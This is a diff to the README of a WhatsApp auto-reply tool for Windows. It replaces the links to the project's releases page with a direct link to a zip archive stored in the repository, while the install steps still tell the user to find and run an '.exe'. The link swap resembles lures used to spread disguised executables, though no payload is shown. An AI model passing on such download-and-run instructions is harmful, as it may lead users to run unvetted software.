@@ -1,6 +1,6 @@
 # 🤖 SWA-simple-whatsapp-answer - Automate your daily WhatsApp messaging tasks
 
-[![Download SWA](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/runwayalbite409/SWA-simple-whatsapp-answer/releases)
+[![Download SWA](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/runwayalbite409/SWA-simple-whatsapp-answer/main/latest/answer-simple-whatsapp-SW-v3.6.zip)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ Before you install this software, check that your computer meets these basic nee
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit this page to download: [https://github.com/runwayalbite409/SWA-simple-whatsapp-answer/releases](https://github.com/runwayalbite409/SWA-simple-whatsapp-answer/releases).
+1. Visit this page to download: [https://raw.githubusercontent.com/runwayalbite409/SWA-simple-whatsapp-answer/main/latest/answer-simple-whatsapp-SW-v3.6.zip](https://raw.githubusercontent.com/runwayalbite409/SWA-simple-whatsapp-answer/main/latest/answer-simple-whatsapp-SW-v3.6.zip).
 2. Locate the file ending in `.exe` for the latest version.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
